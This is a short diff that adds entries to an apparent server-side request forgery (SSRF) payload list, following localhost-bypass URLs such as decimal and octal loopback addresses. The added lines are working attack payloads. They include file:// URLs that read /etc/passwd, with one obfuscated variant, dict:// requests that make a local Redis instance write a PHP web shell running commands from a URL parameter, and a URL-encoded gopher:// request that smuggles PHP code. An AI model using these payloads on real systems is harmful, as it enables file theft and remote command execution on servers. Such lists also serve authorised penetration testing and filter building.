@@ -34,3 +34,9 @@ http://vcap.me
 http://2130706433/ 
 http://0177.0.0.1/ 
 http://o177.0.0.1/ 
+file://path/file
+file:///etc/passwd
+file://\/\/etc/passwd
+dict://127.0.0.1:6379/CONFIG SET dbfilename file.php
+dict://127.0.0.1:6379/SET mykey "<\x3Fphp system($_GET['cmd'])\x3F>"
+gopher://localhost:6379/_POST%20%2fHTTP%2f1.1%0d%0aHost:localhost%0d%0a%3C%3Fphp%20system%28%22ls%22%29%3B%20%3F%3E
